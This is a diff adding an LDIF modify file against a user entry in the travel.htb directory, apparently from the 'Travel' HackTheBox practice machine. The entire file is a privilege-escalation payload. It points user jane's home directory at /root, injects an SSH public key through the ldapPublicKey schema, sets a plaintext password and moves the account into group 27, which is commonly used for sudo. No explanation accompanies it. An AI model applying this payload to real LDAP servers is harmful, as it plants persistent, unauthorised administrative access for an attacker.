@@ -1,0 +1,16 @@
+dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changetype: modify
+replace: homeDirectory
+homeDirectory: /root
+-
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDH7agl1L2JJ9ApoJP5MAk0D13auXnUvO9SH5tQKvUmnMYVWI7+dYlcZozJi9P/6/vqaoGz4NpQxUPsm/Eevb6YZJag0mSvWhsX25+NLlB8bN03DF0NsFTULz7FT3WHHPfvgXnopxtZs0BYuvYgBskogso2dX/IAo+C6plbsZynKKaDy4jWFnZtqHjUh+Nmogz+ZXdBh4ToueigjbfCYFMRkjan+hhrHoHAoQxuYk5w0dKclorS3jAbSTaxPHJzp8eUE7BLAqOGz8Ro1GwtW6hJncdbm+ac2M6jBkozlvjpjYy2V0TZHQgWXUeoMHXjog1X76KaUMMMy0nqGy7qV3qL limitedeternity@Marises-MacBook.local
+-
+replace: userPassword
+userPassword: 0xprashant
+-
+replace: gidNumber
+gidNumber: 27
